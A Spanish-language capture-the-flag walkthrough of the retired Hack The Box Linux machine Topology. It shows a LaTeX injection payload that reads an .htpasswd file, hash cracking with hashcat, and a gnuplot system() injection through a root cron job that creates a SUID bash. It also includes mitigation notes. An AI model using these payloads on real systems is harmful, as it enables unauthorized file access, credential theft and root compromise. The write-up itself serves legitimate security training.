---
machine: Topology
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, latex, file-read, gnuplot, cron]
---

# Topology — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El generador de ecuaciones LaTeX permite inyectar comandos y leer archivos con `\input` o `\lstinputlisting`. Se recupera el `.htpasswd` del vhost `dev`, se crackea la contraseña de `vdaisley` y se entra por SSH. Un cron ejecuta gnuplot como root sobre un script escribible; se inyecta `system()` y se obtiene root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 20.04 y `80/tcp` Apache con `topology.htb`.
- El sitio es estático y enlaza a `latex.topology.htb/equation.php`.
- `ffuf` descubre `dev.topology.htb`, protegido con autenticación básica.

## Enumeración

- `equation.php` convierte LaTeX en imagen y acepta `\input{...}`.
- `\lstinputlisting{/var/www/dev/.htpasswd}` devuelve el hash de `vdaisley`.
- `hashcat` crackea el hash y la contraseña funciona por SSH.

## Foothold

Se inyecta una lectura de archivo en el campo LaTeX y se obtiene el `.htpasswd`; después se crackea y se entra como `vdaisley`.

```bash
curl -s 'http://latex.topology.htb/equation.php' --data-urlencode 'equation=\lstinputlisting{/var/www/dev/.htpasswd}'
hashcat vdaisley.hash rockyou.txt
ssh vdaisley@topology.htb
```

## Movimiento lateral

No hay otro host. El pivote es de la web al archivo `.htpasswd`, de ahí a `vdaisley` y al cron de gnuplot.

## Escalada de privilegios

Un cron root ejecuta `gnuplot` sobre archivos de `/opt/topology`. El script `.plt` es escribible por `vdaisley`; se añade `system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")` y se espera al cron.

```bash
ls -l /opt/topology
echo 'system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")' >> /opt/topology/*.plt
/tmp/rootbash -p
```

## Evidencia

- `.htpasswd` leído con `\lstinputlisting`.
- Hash crackeado y SSH como `vdaisley`.
- Script de gnuplot modificado y `/tmp/rootbash` con SUID.

## Lecciones aprendidas

- LaTeX puede leer archivos y ejecutar comandos si no se restringe.
- Un `.htpasswd` expuesto permite atacar la autenticación básica.
- Un cron que ejecuta gnuplot sobre archivos escribibles es ejecución root.

## Mitigación y detección

- Ejecutar LaTeX en un sandbox sin acceso a archivos ni shell.
- Proteger `.htpasswd` y usar contraseñas fuertes.
- Ejecutar gnuplot con un usuario sin privilegios y directorios de solo lectura.

## Referencias

- [0xdf — Topology](https://0xdf.gitlab.io/2023/11/04/htb-topology.html)
- [IppSec — Topology](https://www.youtube.com/watch?v=W1G11I_nMOQ)
- [Hack The Box — Topology](https://app.hackthebox.com/machines/topology)
